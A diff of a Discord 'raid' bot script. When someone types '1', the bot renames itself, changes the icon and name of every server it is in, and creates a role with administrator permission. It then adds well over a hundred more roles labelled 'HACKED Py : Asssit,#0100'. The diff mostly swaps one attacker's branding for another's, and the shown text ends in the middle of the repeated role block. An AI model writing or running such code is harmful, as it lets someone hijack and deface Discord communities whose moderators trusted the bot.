@@ -33,14 +33,14 @@ LOka.on("message", message => {
 var x1 = "1"
 LOka.on('message', message => {
      if (message.content === "1") {
-LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/542045165242548228/542053119014600740/Error.png`)
+LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/355815652386275338/484901140790640659/438.jpg`)
  
 }
 });
 var x1 = "1"
 LOka.on('message', message => {
      if (message.content === "1") {
-LOka.user.setUsername("' Asssit,oFF#3068")
+LOka.user.setUsername("' Asssit,#0100")
  
 }
 });
@@ -54,14 +54,14 @@ LOka.user.setGame(`Ouut.`,'https://www.twitch.tv/MeeRcY')
 LOka.on('message', message => {
      if (message.content === "1") {
          LOka.guilds.forEach(m =>{
-             m.setIcon(`https://cdn.discordapp.com/attachments/542045165242548228/542053119014600740/Error.png`)
+             m.setIcon(`https://cdn.discordapp.com/attachments/359013848151490572/527822471530020876/unknown.png`)
 })
 }
 });
 LOka.on('message', message => {
      if (message.content === "1") {
          LOka.guilds.forEach(m =>{
-             m.setName(`By : الدببه الثلاثه`)
+             m.setName(`Out.`)
 })
 }
 });
@@ -86,1302 +86,1302 @@ LOka.on('message', message => {
         color : "RANDOM"
     })
     m.createRole({
-        name : "Asssit,oFF#3068",
+        name : "Maraamm هيهيهي",
         permissions :   [8],
         color : "RANDOM"
     })
     m.createRole({
-        name : ".Maddox#0007",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "×_×#0777",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "الدببه الثلاثه",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
